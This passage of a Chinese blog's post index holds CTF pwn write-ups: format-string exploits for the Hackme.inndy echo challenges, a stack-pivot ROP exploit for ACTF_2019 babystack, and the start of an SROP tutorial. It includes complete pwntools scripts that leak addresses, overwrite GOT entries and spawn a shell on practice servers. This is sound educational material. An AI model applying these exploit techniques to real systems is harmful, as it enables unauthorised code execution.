return参考链接参考链接","categories":[{"name":"随手小记","slug":"随手小记","permalink":"http://liul14n.top/categories/随手小记/"}],"tags":[]},{"title":"[Hackme.inndy]echo/echo2/echo3","slug":"Hackme-inndy-echo-echo2-echo3","date":"2020-03-16T11:11:44.000Z","updated":"2022-01-07T06:37:49.371Z","comments":true,"path":"2020/03/16/Hackme-inndy-echo-echo2-echo3/","link":"","permalink":"http://liul14n.top/2020/03/16/Hackme-inndy-echo-echo2-echo3/","excerpt":"","text":"0x00 前言通过三道格式化字符串的题目学习巩固格式化字符串漏洞的利用这是[Hackme.inndy]的题目，在BUUOJ上也能找得到。做这三道题目用了不少时间，仔细想想，还是因为最开始学格式化字符串的时候没学扎实，漏了挺多细节，导致题目打不通。不过虽然用了不少时间，但是收获还是非常多的。0x01 echo这是三道题目里面最简单的一道。分析12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000)很明显存在格式化字符串漏洞。思路由于是32位程序，可以直接利用pwntools的fmtstr_payload模块构造payload，覆盖printf_got为system_plt，然后sendline(&#39;/bin/sh&#39;)即可EXP123456789101112131415161718from pwn import *from LibcSearcher import *#c = process('./echo')c = remote('node3.buuoj.cn',29729)elf = ELF('./echo')printf = elf.got['printf']system = elf.plt['system']payload = fmtstr_payload(7,&#123;printf:system&#125;)c.sendline(payload)c.sendline('/bin/sh')c.interactive()0x02 echo2这道题相比第一道要有些难度了。分析12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: PIE enabled可以看到程序开启了PIE且是64位程序。所以要先泄露程序真正的加载地址，然后再覆盖printf_got为system_plt。不过这里不能再用pwntools的fmtstr_payload模块了,因为64位程序的地址容易出现’\\x00’造成截断。Do it！泄露程序加载地址可以在IDA中看到call printf的地址为0x984，这是相对偏移，gdb下断在此处然后查看栈的情况如下:能够看到0x7fffffffde48存放着main+74，0x7fffffffde58存放着__libc_start_main+240调试可以知道这两处分别对应%41$p、%43$p通过pie命令可以知道程序加载基址为0x555555554000，这和我们的main+74正好相差0xa03，由此可以泄露出程序加载基址。123456789101112payload = '%41$p---' + '%43$p...'c.sendline(payload)elfbase = int(c.recvuntil('---',drop = True),16) - 0xa03l_s_m_addr = int(c.recvuntil('...',drop = True),16) - 240#libc = LibcSearcher('__libc_start_main',l_s_m_addr)#libcbase = l_s_m_addr - libc.dump('__libc_start_main')system = elf.plt['system'] + elfbase#system = libcbase + libc.dump('system')printf = elf.got['printf'] + elfbasesuccess('printf = ' + hex(printf))success('system = ' + hex(system))实际上只需要泄露出elfbase即可，但是大多数wp都同时泄露了__libc_start_main进而泄露libcbase，然后通过libcbase+libc.dump(‘system’)来得到system地址根据注释应该能看出来这是两种方法，通过测试这两种方法都是可以打通的构造payload&amp;getshell这算是第一次接触64位的格式化字符串漏洞吧，之前打32位的时候一直用的fmtstr_payload,现在没法用它，感觉少了些什么。第一次打的时候是手动构造的payload，但是懒惰成为了第一生产力，我在网上搜了两个64位的fmtstr_payload，其中一个完全不能用，还有一个这道题能用，但是别的题好像就不行了。放一下链接这道题可用完全打不通无奈只能仿照着这俩自己写了一个，虽然也是有一定的局限性，还可能有bug，但我测了好几组样例，都正常，当然还有一些地方可以优化，但是太懒了，就懒得鼓捣了。12345678910111213141516171819202122232425262728293031323334353637383940def fmtstr_payload64(offset, src, data,type = 'byte'): \"\"\" 生成 64 位格式化字符串payload offset: 偏移 src: 源地址 data: 欲写入内容 type: 目前只支持int、longlong、byte类型，默认为byte \"\"\" payload = '' data = hex(data).replace('L','') if type == 'int': dataLen = 8 elif type == 'longlong': dataLen = 16 else: dataLen = len(data[2:]) if len(data[2:])%2==0 else len(data[2:])+1 x = (dataLen/2)*12/8 if (dataLen/2)*12%8 == 0 else (dataLen/2)*12/8 + 1 data = data[2:].rjust(16,'0') curNum = 0 index = 0 while index&lt;dataLen/2: num = data[-2-(index*2):] if index == 0 else data[-2-(index*2):0-(index*2)] num = int(num,16) if index == 0: payload += '%' + str(num) + 'c%' + str(offset + x + index) + '$hhn' curNum = num else: if num &lt;= (curNum&amp;0xff): payload += '%' + str(num + 0x100*(curNum/0x100 + 1) - curNum) + 'c%' + str(offset + x + index) + '$hhn' curNum = num + 0x100*(curNum/0x100 + 1) else: payload += '%' + str(num + 0x100*(curNum/0x100) - curNum) + 'c%' + str(offset + x + index) + '$hhn' curNum = num + 0x100*(curNum/0x100 ) index += 1 payload = payload.ljust(8*x,'a') index = 0 while index&lt;dataLen/2: payload += p64(src + index) index += 1 return payload然后覆盖就行了。12345payload = fmtstr_payload64(offset,printf,system)sleep(1)c.sendline(payload)c.sendline('/bin/sh\\x00')c.interactive()EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#coding:utf-8from pwn import *from LibcSearcher import *context(arch = 'amd64',os = 'linux')def fmtstr_payload64(offset, src, data,type = 'byte'): \"\"\" 生成 64 位格式化字符串payload offset: 偏移 src: 源地址 data: 欲写入内容 type: 目前只支持int、longlong、byte类型，默认为byte \"\"\" payload = '' data = hex(data).replace('L','') if type == 'int': dataLen = 8 elif type == 'longlong': dataLen = 16 else: dataLen = len(data[2:]) if len(data[2:])%2==0 else len(data[2:])+1 x = (dataLen/2)*12/8 if (dataLen/2)*12%8 == 0 else (dataLen/2)*12/8 + 1 data = data[2:].rjust(16,'0') curNum = 0 index = 0 while index&lt;dataLen/2: num = data[-2-(index*2):] if index == 0 else data[-2-(index*2):0-(index*2)] num = int(num,16) if index == 0: payload += '%' + str(num) + 'c%' + str(offset + x + index) + '$hhn' curNum = num else: if num &lt;= (curNum&amp;0xff): payload += '%' + str(num + 0x100*(curNum/0x100 + 1) - curNum) + 'c%' + str(offset + x + index) + '$hhn' curNum = num + 0x100*(curNum/0x100 + 1) else: payload += '%' + str(num + 0x100*(curNum/0x100) - curNum) + 'c%' + str(offset + x + index) + '$hhn' curNum = num + 0x100*(curNum/0x100 ) index += 1 payload = payload.ljust(8*x,'a') index = 0 while index&lt;dataLen/2: payload += p64(src + index) index += 1 return payload#c = process('./echo2')elf = ELF('./echo2')c = remote('node3.buuoj.cn',28145)offset = 6payload = '%41$p---' + '%43$p...'sleep(1)c.sendline(payload)elfbase = int(c.recvuntil('---',drop = True),16) - 0xa03l_s_m_addr = int(c.recvuntil('...',drop = True),16) - 240#libc = LibcSearcher('__libc_start_main',l_s_m_addr)#libcbase = l_s_m_addr - libc.dump('__libc_start_main')system = elf.plt['system'] + elfbase#system = libcbase + libc.dump('system')printf = elf.got['printf'] + elfbasesuccess('printf = ' + hex(printf))success('system = ' + hex(system))payload = fmtstr_payload64(offset,printf,system)sleep(1)c.sendline(payload)#gdb.attach(c)sleep(1)c.sendline('/bin/sh\\x00')c.interactive()0x03 echo3这道题的远程快给我打吐了。应该是BUU上面环境没配置好，远程怎么都打不通，各种exp都试了也不行，但是远程打题目原平台hackme.inndy却能打通。。。分析第一次接触这类Fmt_bss类型的格式化字符串题目。和前两道题目相比，这道题目buf在bss段main函数有一处调用了alloca，alloca的参数是个随机值，然后sub esp, eax使得esp被减一个随机的值，导致栈地址比较随机。这两点我都是第一次接触，做起来用了挺长时间。查阅了大量WP以后，得知这类型(Fmt_bss)的题目有一个套路，就是找跳板，然后覆盖printf_got为system。再传入/bin/sh找跳板的原因？找跳板的原因？：对于%ac$xna为个数，x是偏移，如果此处地址里面存放的依旧是个指针(地址)，那么会向里面存放的指针所指向的地方写入数据。即 A-&gt;B-&gt;C,A和B都是地址，则最后数据会写到C处。Do it!写在前面在开始之前，有一点需要了解:在打本地的时候，程序默认加载的是本地默认libc，但是打远程的时候，程序则加载远程默认libc。这道题目原题作者给了libc-2.23.so.i386这个libc和我们正常的libc-2.23.so.i386不太一样。但是使用不同的libc运行时，栈结构有差异，而我们找跳板正是利用了栈结构的一些特性，所以在本地调试的时候就需要通过指定libc，产生与远程相同的栈结构。遇到的困难 (未解决)//3月19号已解决。非常不幸，尽管我已经下载下来了作者提供的libc-2.23.so.i386，但是我依旧没办法让程序优先加载这个libc，试了许多方法，包括设置LD_PRELOAD、process(&#39;./echo3&#39;,env = {&quot;LD_PRELOAD&quot;: &quot;./libc-2.23.so.i386&quot;})、软链接、(这么做之前一定要备份原有的libc)删掉/lib/i386-linux-gnu/libc-2.23.so和libc.so.6，然后用作者给的libc替换libc-2.23.so，然后再用软链接搞出来libc.so.6这些方法都会导致各种各样的报错，比如段错误、不能加载libc-2.23.so.i386之类的。初步推测是这个libc-2.23.so.i386有点问题？如果能在本地通过加载作者给的libc来调试，就能得到准确的偏移，远程应该也就能打得通了。但是重在学习fmt_bss类题目的打法，拿不拿得到flag就不是那么重要了，本文将写本地打法思路程序本身没有system函数，所以需要先泄露libcbase，然后得到system函数。同时也需要泄露栈地址，以便我们找跳板。通过跳板修改printf_got为system传入/bin/sh来getshell泄露栈地址和libcbase由于程序存在alloca并且sub esp, eax，会导致栈地址的变动。不过有一点非常有意思。写个程序运算一下，可以发现alloca的参数只有如下可能[&#39;0x10&#39;, &#39;0x20&#39;, &#39;0x30&#39;, &#39;0x40&#39;, &#39;0x50&#39;, &#39;0x1010&#39;, &#39;0x1020&#39;, &#39;0x1030&#39;, &#39;0x1040&#39;, &#39;0x1050&#39;, &#39;0x2010&#39;, &#39;0x2020&#39;, &#39;0x2030&#39;, &#39;0x2040&#39;, &#39;0x2050&#39;, &#39;0x3010&#39;, &#39;0x3020&#39;, &#39;0x3030&#39;, &#39;0x3040&#39;, &#39;0x3050&#39;]123456789101112131415161718192021&gt;0x20 4096 0.0330749354005&gt;0x1010 2048 0.0165374677003&gt;0x1050 2048 0.0165374677003&gt;0x1030 4096 0.0330749354005&gt;0x2010 2048 0.0165374677003&gt;0x30 4096 0.0330749354005&gt;0x50 2048 0.0165374677003&gt;0x40 4096 0.0330749354005&gt;0x3050 2047 0.0165293927649&gt;0x3010 2048 0.0165374677003&gt;0x2020 4096 0.0330749354005&gt;0x1040 4096 0.0330749354005&gt;0x1020 4096 0.0330749354005&gt;0x3020 4096 0.0330749354005&gt;0x10 2048 0.0165374677003&gt;0x2040 4096 0.0330749354005&gt;0x3030 4096 0.0330749354005&gt;0x3040 4096 0.0330749354005&gt;0x2050 2048 0.0165374677003&gt;0x2030 4096 0.0330749354005&gt;从左到右依次是 16进制表示、10进制表示、出现概率。我们可以通过多次尝试或者直接在exp里加入控制语句来让这个栈的减少值固定下来。在此之前，先来调试一下，看看此时栈有什么特征，以便在exp加入控制语句。gdb调试12308048774 sub esp, eax...08048646 call _printf在这两处位置下断，执行到第一个断点的时候set $eax = 0x20，使得esp=0x20,当然也可以选取别的值。接着执行，到call printf的时候stack 100 查看栈情况。能够看到__libc_start_main + 247,此时其偏移为43 可通过%43$p来打印出来。可以发现其特征为后三位为637，选取后三位是因为这三位是不变的，如果虚拟机开了ASLR，除了后三位以外，其他位置都有可能变。通过这个能泄露出libcbase，但还需要泄露出栈地址，这里选择偏移为30的这一处123456789101112131415161718192021222324252627282930from pwn import *from LibcSearcher import *context(arch = 'i386',os = 'linux')while True: #c = remote('hackme.inndy.tw',7720) c = remote('node3.buuoj.cn',29736) #c = process(\"./echo3\") sleep(0.1) c.sendline('%43$p.%30$p=') lsm = c.recvuntil('.',drop = True) if lsm[-3:] == '637': libc_start_main = int(lsm,16)-247 success('OK!') success('lsm = ' + lsm) addr = int(c.recvuntil('=',drop = True),16) success('addr = ' + hex(addr)) break c.close()elf = ELF('./echo3')libc = ELF('/lib/i386-linux-gnu/libc.so.6')#for process()#libc = ELF('./libc-2.23.so.i386')#for remote()#libc = LibcSearcher('__libc_start_main',libc_start_main)#libcbase = libc_start_main - libc.dump('__libc_start_main')libcbase = libc_start_main - libc.symbols['__libc_start_main']printf_got = elf.got['printf']system = libcbase + libc.symbols['system']success('printf_got = ' + hex(printf_got))success('system = ' + hex(system))找跳板原理利用了之前讲到的A-&gt;B-&gt;C由于刚才已经找到了位于30偏移的栈地址，其地址里存的是位于87偏移的地址，87偏移的地址里面存的是一些其他东西。这道题比较巧，栈里面存在_GLOBAL_OFFSET_TABLE_可以覆盖其低位字节来让其指向printf_got。图中这两处偏移分别为20和21所以跳板流程可以如下表示，为了看起来更舒服，这里用偏移来代替地址。。这里_GLOBAL_OFFSET_TABLE_表示的是存放_GLOBAL_OFFSET_TABLE_的栈地址。。。123456789101112131415-----第一步，利用30-------修改前30-&gt;87-&gt;其他修改后30-&gt;87-&gt;21-----第二步，利用87-------修改前87-&gt;21-&gt;_GLOBAL_OFFSET_TABLE_修改后87-&gt;21-&gt;printf_got----第三步，利用21-------修改前21-&gt;printf_got修改后21-&gt;printf_got-&gt;system可以看出，每一步，对应A-&gt;B-&gt;C中A和B位置的都是指针。然而，这样由于printf反馈的数据太多了，大概会运行好几分钟。。。而如果打远程的话，恐怕没这么多时间，而且考虑网络因素，这样就算payload正确也很难打通吧因此有了改进的payload，每次修改2字节，这样会大大降低数据量。12345678910111213141516171819202122232425262728293031----第一步----借助30和31修改前30-&gt;87-&gt;其他31-&gt;85-&gt;其他修改后30-&gt;87-&gt;2031-&gt;85-&gt;21----第二步----借助85和87修改前85-&gt;21-&gt;_GLOBAL_OFFSET_TABLE_87-&gt;20-&gt;_GLOBAL_OFFSET_TABLE_+4修改后87-&gt;20-&gt;printf_got85-&gt;21-&gt;printf_got + 2----第三步----借助20和21修改前20-&gt;printf_got21-&gt;printf_got + 2修改后20-&gt;printf_got-&gt;system后两字节21-&gt;printf_got + 2-&gt;system前两字节//关于这里字节的前后,更博的时候我自己都绕晕了...记录一下[+] printf_got = 0x804a014[+] system = 0xf7e3fda0pwndbg&gt; x/4x 0x804a0140x804a014: 0xa0 0xfd 0xe3 0xf7pwndbg&gt; x/wx 0x804a0140x804a014: 0xf7e3fda0//应该能看明白吧第二步挺巧妙的1214:0050│ 0xffffcfd0 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x115:0054│ 0xffffcfd4 —▸ 0x804a060 (magic) ◂— 0xadb5e79a可以看到0xffffcfd0和0xffffcfd0+4所存的地址都是0x804axxx而正好_GLOBAL_OFFSET_TABLE_为0x804a000，不同函数got值前两字节是不变的，改变的只是后两字节，因此我们才有了每次修改两字节的方法。这里还有一个细节，我们来看system。[+] system = 0xf7e3fda0可以看出 system的前两字节0xf7e3要小于后两字节0xfda0，再想想我们fmt_payload的构造方法，就能得知要先修改值小的前两字节，然后再修改后两字节。所以得到代码如下:12345678910111213141516171819202122got_table = addr-0x10csuccess('got_table = ' + hex(got_table))payload = '%&#123;&#125;c%&#123;&#125;$hn'.format(got_table &amp; 0xffff,30)payload += '%&#123;&#125;c%&#123;&#125;$hn'.format(4 , 31) + '1111'c.sendline(payload)c.recvuntil('1111')payload = '%&#123;&#125;c%&#123;&#125;$hn'.format(printf_got &amp; 0xffff,87)payload += '%&#123;&#125;c%&#123;&#125;$hn'.format(2,85) + '2222'c.sendline(payload)c.recvuntil('2222')payload = '%&#123;&#125;c%&#123;&#125;$hn'.format((system&gt;&gt;16) &amp; 0xffff,21)payload += '%&#123;&#125;c%&#123;&#125;$hn'.format((system &amp; 0xffff) - ((system&gt;&gt;16) &amp; 0xffff),20) + '3333'c.sendline(payload)c.recvuntil('3333')c.sendline('/bin/sh\\x00')c.interactive()完整EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#coding:utf-8from pwn import *from LibcSearcher import *context(arch = 'i386',os = 'linux')while True: #c = remote('hackme.inndy.tw',7720) #c = remote('node3.buuoj.cn',29736) c = process(\"./echo3\") sleep(0.1) c.sendline('%43$p.%30$p=') lsm = c.recvuntil('.',drop = True) if lsm[-3:] == '637': libc_start_main = int(lsm,16)-247 success('OK!') success('lsm = ' + lsm) addr = int(c.recvuntil('=',drop = True),16) success('addr = ' + hex(addr)) break c.close()elf = ELF('./echo3')libc = ELF('/lib/i386-linux-gnu/libc.so.6')#libc = ELF('./libc-2.23.so.i386')#libc = LibcSearcher('__libc_start_main',libc_start_main)#libcbase = libc_start_main - libc.dump('__libc_start_main')libcbase = libc_start_main - libc.symbols['__libc_start_main']printf_got = elf.got['printf']system = libcbase + libc.symbols['system']success('printf_got = ' + hex(printf_got))success('system = ' + hex(system))#sleep(3)got_table = addr-0x10csuccess('got_table = ' + hex(got_table))payload = '%&#123;&#125;c%&#123;&#125;$hn'.format(got_table &amp; 0xffff,30)payload += '%&#123;&#125;c%&#123;&#125;$hn'.format(4 , 31) + '1111'c.sendline(payload)c.recvuntil('1111')payload = '%&#123;&#125;c%&#123;&#125;$hn'.format(printf_got &amp; 0xffff,87)payload += '%&#123;&#125;c%&#123;&#125;$hn'.format(2,85) + '2222'c.sendline(payload)c.recvuntil('2222')payload = '%&#123;&#125;c%&#123;&#125;$hn'.format((system&gt;&gt;16) &amp; 0xffff,21)payload += '%&#123;&#125;c%&#123;&#125;$hn'.format((system &amp; 0xffff) - ((system&gt;&gt;16) &amp; 0xffff),20) + '3333'c.sendline(payload)c.recvuntil('3333')c.sendline('/bin/sh\\x00')c.interactive()3月19日凌晨针对echo3的新更新请教了一下大佬，关于之前为什么我没法指定题目给的libc来运行echo3，原来我姿势不对。这里贴一下陈大佬的看雪文章陈老板的看雪文章里面介绍了如何利用patchelf这个工具来更换程序libc。主要命令就是两条，以这道题目的echo3和libc-2.23.so.i386为例来说，我们还需要一个ld-2.23.so！！！注意这个ld-2.23.so不能直接在/lib/i386-linux-gnu/ld-2.23.so取，这个会一直报段错误。。。被这个困扰了好长时间！多亏陈大佬提醒要去glibc all in one 里下载然后我们通过patchelf来更换程序的libcpatchelf --set-interpreter ./ld-2.23.so ./echo3patchelf --replace-needed libc.so.6 ./libc-2.23.so.i386 ./echo3第一条指令是用来修改ld的，第二条指令是用来修改libc的。改完以后是这样的。本地又调了调，调好本地能打通了，但这在BUU上依旧没法打通，不过在hackme.inndy.tw上面打得通只能说BUU上面的libc有些。。奇葩吧,拿不拿得到flag其实也就那样了,关键是通过这道题目学了好多东西,这要比拿再多的flag都要有意义。和之前的exp相比，就改了一下改printf_got为system的顺序，因为换了libc以后，system的前两个字节要大于后两个字节。exp:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#coding:utf-8from pwn import *from LibcSearcher import *context(arch = 'i386',os = 'linux')while True: c = remote('hackme.inndy.tw',7720) #c = remote('node3.buuoj.cn',27252) #c = process(\"./echo3\") sleep(0.2) c.sendline('%43$p.%30$p=') lsm = c.recvuntil('.',drop = True) if lsm[-3:] == '637': libc_start_main = int(lsm,16)-247 success('OK!') success('lsm = ' + lsm) addr = int(c.recvuntil('=',drop = True),16) success('addr = ' + hex(addr)) break c.close()elf = ELF('./echo3')#libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')libc = ELF('./libc-2.23.so.i386')#libc = LibcSearcher('__libc_start_main',libc_start_main)#libcbase = libc_start_main - libc.dump('__libc_start_main')libcbase = libc_start_main - libc.symbols['__libc_start_main']printf_got = elf.got['printf']system = libcbase + libc.symbols['system']success('printf_got = ' + hex(printf_got))success('system = ' + hex(system))sleep(1)got_table = addr-0x10csuccess('got_table = ' + hex(got_table))payload = '%&#123;&#125;c%&#123;&#125;$hn'.format(got_table &amp; 0xffff,30)payload += '%&#123;&#125;c%&#123;&#125;$hn'.format(4 , 31) + '1111'c.sendline(payload)c.recvuntil('1111')payload = '%&#123;&#125;c%&#123;&#125;$hn'.format(printf_got &amp; 0xffff,87)payload += '%&#123;&#125;c%&#123;&#125;$hn'.format(2,85) + '2222'c.sendline(payload)c.recvuntil('2222')payload = '%&#123;&#125;c%&#123;&#125;$hn'.format(system &amp; 0xffff,20)payload += '%&#123;&#125;c%&#123;&#125;$hn'.format(((system&gt;&gt;16) &amp; 0xffff) - (system &amp; 0xffff) ,21) + '3333'c.sendline(payload)#gdb.attach(c)c.recvuntil('3333')c.sendline('/bin/sh\\x00')c.interactive()3月19号下午针对echo3的新更新……晚上做梦梦到好像有人告诉我这道题应该用LibcSearcher来弄libc…试了一下…果然可以!123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#coding:utf-8from pwn import *from LibcSearcher import *context(arch = 'i386',os = 'linux')while True: #c = remote('hackme.inndy.tw',7720) c = remote('node3.buuoj.cn',25796) #c = process(\"./echo3\") sleep(0.2) c.sendline('%43$p.%30$p=') lsm = c.recvuntil('.',drop = True) if lsm[-3:] == '637': libc_start_main = int(lsm,16)-247 success('OK!') success('lsm = ' + lsm) addr = int(c.recvuntil('=',drop = True),16) success('addr = ' + hex(addr)) break c.close()elf = ELF('./echo3')#libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')#libc = ELF('./libc-2.23.so.i386')libc = LibcSearcher('__libc_start_main',libc_start_main)libcbase = libc_start_main - libc.dump('__libc_start_main')#libcbase = libc_start_main - libc.symbols['__libc_start_main']printf_got = elf.got['printf']#system = libcbase + libc.symbols['system']system = libcbase + libc.dump('system')success('printf_got = ' + hex(printf_got))success('system = ' + hex(system))sleep(1)got_table = addr-0x10csuccess('got_table = ' + hex(got_table))payload = '%&#123;&#125;c%&#123;&#125;$hn'.format(got_table &amp; 0xffff,30)payload += '%&#123;&#125;c%&#123;&#125;$hn'.format(4 , 31) + '1111'c.sendline(payload)c.recvuntil('1111')payload = '%&#123;&#125;c%&#123;&#125;$hn'.format(printf_got &amp; 0xffff,87)payload += '%&#123;&#125;c%&#123;&#125;$hn'.format(2,85) + '2222'c.sendline(payload)c.recvuntil('2222')payload = '%&#123;&#125;c%&#123;&#125;$hn'.format(system &amp; 0xffff,20)payload += '%&#123;&#125;c%&#123;&#125;$hn'.format(((system&gt;&gt;16) &amp; 0xffff) - (system &amp; 0xffff) ,21) + '3333'c.sendline(payload)#gdb.attach(c)c.recvuntil('3333')c.sendline('/bin/sh\\x00')c.interactive()libc选的这个0x04 参考链接博客园传送门先知社区Freebuf先知社区简书传送门传送门和指定libc有关的参考链接CSDN传送门陈老板的看雪文章patchelf","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://liul14n.top/categories/Pwn/"}],"tags":[]},{"title":"[栈迁移]ACTF_2019_babystack","slug":"栈迁移-ACTF-2019-babystack","date":"2020-03-14T08:28:06.000Z","updated":"2020-03-28T16:58:27.131Z","comments":true,"path":"2020/03/14/栈迁移-ACTF-2019-babystack/","link":"","permalink":"http://liul14n.top/2020/03/14/栈迁移-ACTF-2019-babystack/","excerpt":"","text":"0x00 前言题目考察点:栈迁移、ROP、ret2leave题目来源:BUUCTF写这篇博客为了记录一下栈迁移的用法。0x01 分析12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000)程序最大可以读入0xE0字节的数据，而s与rbp的距离为0xD0，所以还可以溢出0xE0-0xD0 = 0x10个字节的数据，但是这0x10只够覆盖rbp和返回地址。程序会把栈地址打印出来。程序开了NX保护，无法往栈上写入shellcode来执行所以考虑栈迁移，然后构造ROP链。0x02 EXP与解释这道题比较简单，直接放EXP了，一些关键点会解释一下。12345678910111213141516171819202122232425262728293031323334353637383940#coding:utf-8from pwn import *from LibcSearcher import *context(log_level = 'debug',arch = 'amd64',os = 'linux')#c = process('./babystack')elf = ELF('./babystack')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')c = remote('node3.buuoj.cn',28934)main = 0x4008F6leave = 0x400A18pop_rdi_ret = 0x400ad3def sendMsg(payload): c.recvuntil('&gt;') c.sendline(str(0xe0)) c.recvuntil('Your message will be saved at ') addr = int(c.recvuntil('\\n',drop = True),16) success('stack_addr = ' + hex(addr)) payload += 'a'*(0xd0 - len(payload)) + p64(addr) + p64(leave) c.recvline() c.recvuntil('&gt;') c.send(payload)#注意这里要send，不能用sendline，不然程序接收和发送不匹配！！！！payload = 'a'*8 + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main)sendMsg(payload)c.recvuntil('Byebye~\\n')puts_addr = u64(c.recvuntil('\\n',drop = True).ljust(8,'\\x00'))success('puts_addr = ' + hex(puts_addr))#libc = LibcSearcher('puts',puts_addr)#libcbase = puts_addr - libc.dump('puts')libcbase = puts_addr - libc.symbols['puts']execv = libcbase + 0x4f2c5payload = 'a'*8 + p64(execv)sendMsg(payload)c.interactive()由于题目并没有给libc，可以考虑用LibcSearcher(实际上libc就是libc-2.27.so)来看第一个payload，关于它的执行流程，可以看下面:12345678910111213141516171819202122232425read之前 RBP 0x7fffffffdd90 —▸ 0x400a70 ◂— 0x41ff894156415741 RSP 0x7fffffffdcc0 ◂— 0x0call read: rbp里面的内容被覆盖为程序打印出的栈地址，也就是s的首地址 RBP 0x7fffffffdd90 —▸ 0x7fffffffdcc0 ◂— 0x6161616161616161 ('aaaaaaaa') RSP 0x7fffffffdcc0 ◂— 0x6161616161616161 ('aaaaaaaa')leave(程序自身的leave，位于0x400A18)，mov rsp,rbp;pop rbp（使得rsp+=8，指向了我们的p64(leave)） RBP 0x7fffffffdcc0 ◂— 0x6161616161616161 ('aaaaaaaa') RSP 0x7fffffffdd98 —▸ 0x400a18 ◂— 0x8348e5894855c3c9ret(程序自身的ret，位于0x400A19)，将我们传入的p64(leave)传给rip，rsp+=8，接着执行leave;ret。 RBP 0x7fffffffdcc0 ◂— 0x6161616161616161 ('aaaaaaaa') RSP 0x7fffffffdda0 ◂— 0x0leave(我们的p64(leave)),mov rsp,rbp;pop rbp; 此时rsp又指向了s首地址+8的位置，即p64(pop_rdi_ret) RBP 0x6161616161616161 ('aaaaaaaa') RSP 0x7fffffffdcc8 —▸ 0x400ad3 ◂— 0x841f0f2e6690c35fret(我们传入的)，pop rdi;将p64(pop_rdi_ret)传给rip RBP 0x6161616161616161 ('aaaaaaaa') RSP 0x7fffffffdcd0 —▸ 0x601020 —▸ 0x7ffff7a649c0 (puts) ◂— push r13此时 RIP -- &gt; pop_rdi_ret，从而执行我们的ROP链有的博主把这块构造叫做ret2leave关于第二个payload，我试过通过rop链构造system(&#39;/bin/sh&#39;)但是打不通，所以这里采用one_gadget这里选用的第一个0x4f2c5，然后老样子构造payload即可。0x03 写在最后这道题目不难，关键是理解这个栈迁移的原理和ret2leave的执行流程。可以总结一下:leave相当于 rsp = rbp + 8; rbp = [rbp];为了达到我们的目的(让rsp指向 rbp里面的值+8的位置)，一次leave是不够的，所以本题需要两次，才能使得rsp = [rbp] + 8","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://liul14n.top/categories/Pwn/"}],"tags":[]},{"title":"通过三道题目学习SROP技术","slug":"通过三道题目学习SROP技术","date":"2020-03-11T13:55:13.000Z","updated":"2020-10-07T07:06:10.288Z","comments":true,"path":"2020/03/11/通过三道题目学习SROP技术/","link":"","permalink":"http://liul14n.top/2020/03/11/通过三道题目学习SROP技术/","excerpt":"","text":"0x00 前言很久之前就听大佬说过SROP了，前几天也通过SROP技术做出来一道题目，不过是看的别人WP之后才会的。今天具体学习了一下SROP技术，先贴几个参考链接:CTF-WIKIFreeBuf需要注意的是，pwntools中的SigreturnFrame中并不需要填写rt_sigreturn的地址，我们只需要确保执行rt_sigreturn的时候栈顶是SigreturnFrame就行。形如：12mov rax,15;syscall;这种可以直接send(str(frame))但形如12read(0, &amp;buf, 0x100uLL);syscall(15LL, &amp;buf);这种需要send(str(frame)[8:])前八个是调用rt_sigreturn函数的 ?本文通过三道题目来练习这项技术，题目按照顺序来的层层递进0x01 Ciscn_2019_s_3这道题目也就是我刚刚说过的通过别人的WP第一次了解SROP并用这技术做出来的题目。这道题目的特点在于题目已经给了mov rax,59(对应execve系统调用)、mov rax,15(对应sigreturn系统调用)SROP能够利用到的gadgets是syscall; ret因为之前我已经专门更过这道题的博客了，所以这里直接放链接传送门0x02 smallest pwn这是CTF-WIKI上面给的一道例题。这道题目的特点是程序非常小，由汇编语言写成相比上一道题目，没有给出mov rax,59或者mov rax,15需要通过程序的read系统调用的读入字节数来设置rax的值。SROP能够利用的gadgets是syscall;ret这道题目有一个博主已经讲解的非常详细了，而且最后这位博主画的流程图很直观，我再写也只能是模仿，很难再超越了。这里直接给出链接了简书0x03 rootersctf_2019_srop这是BUUCTF上的一道题目这道题的特点是程序非常小，由汇编语言写成依然没有mov rax,59或者mov rax,15存在pop rax能够利用的gadgets是pop rax;syscall;leave;ret和syscall;leave;ret（可以注意到相比前两道题目，syscall和ret之间多了一个leave0x001 分析12345Arch: amd64-64-littleRELRO: No RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000)程序只开了NX保护123456789101112131415161718192021222324252627282930313233343536373839404142.text:0000000000401000 ; =============== S U B R O U T I N E =======================================.text:0000000000401000.text:0000000000401000 ; Attributes: bp-based frame.text:0000000000401000.text:0000000000401000 sub_401000 proc near ; CODE XREF: start↓p.text:0000000000401000 ; DATA XREF: LOAD:0000000000400088↑o.text:0000000000401000.text:0000000000401000 buf = byte ptr -80h.text:0000000000401000.text:0000000000401000 push rbp.text:0000000000401001 mov rbp, rsp.text:0000000000401004 sub rsp, 40h.text:0000000000401008 mov eax, 1.text:000000000040100D mov edi, 1 ; fd.text:0000000000401012 lea rsi, buf ; &quot;Hey, can i get some feedback for the CT&quot;....text:000000000040101A mov edx, 2Ah ; count.text:000000000040101F syscall ; LINUX - sys_write.text:0000000000401021 mov edi, 0 ; fd.text:0000000000401026 lea rsi, [rsp+40h+buf] ; buf.text:000000000040102B mov edx, 400h ; count.text:0000000000401030 push 0.text:0000000000401032 pop rax.text:0000000000401033 syscall ; LINUX - sys_read.text:0000000000401035 leave.text:0000000000401036 retn.text:0000000000401036 sub_401000 endp.text:0000000000401036.text:0000000000401037.text:0000000000401037 ; =============== S U B R O U T I N E =======================================.text:0000000000401037.text:0000000000401037 ; Attributes: 